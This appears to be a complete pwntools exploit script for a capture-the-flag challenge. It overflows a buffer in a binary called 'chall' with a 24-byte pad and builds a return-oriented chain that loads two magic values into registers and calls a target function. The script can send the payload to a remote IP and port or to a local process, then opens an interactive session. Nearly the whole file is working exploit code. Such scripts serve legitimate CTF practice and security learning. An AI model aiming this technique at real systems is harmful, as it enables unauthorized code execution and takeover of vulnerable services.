from pwn import *

# context.binary = ELF('./chall', checksec=False)
context.binary = ELF('./chall', checksec=False)
context.arch = 'amd64'
# context.log_level = 'debug'

# ========== Switch LOCAL/REMOTE ==========
LOCAL = True  
HOST = '134.209.111.26'
PORT = 1338

# ========== Target gadgets & values ==========
offset = 24

pop_rdi     = p64(0x401242)
pop_rsi_r15 = p64(0x401244)
target_func = p64(0x401186)

first  = p64(0xdeadbeefdeadbeef)
second = p64(0xc0debabec0debabe)
junk   = p64(0x0)

payload = flat(
    b"A" * offset,
    pop_rdi,
    first,
    pop_rsi_r15,
    second,
    junk,
    target_func
)

# ========== Launch process ==========
if LOCAL:
    p = process('./chall')
else:
    p = remote(HOST, PORT)

# ========== Exploit ==========
p.sendlineafter(b'Name:', payload)
# p.sendafter(payload)
p.interactive()
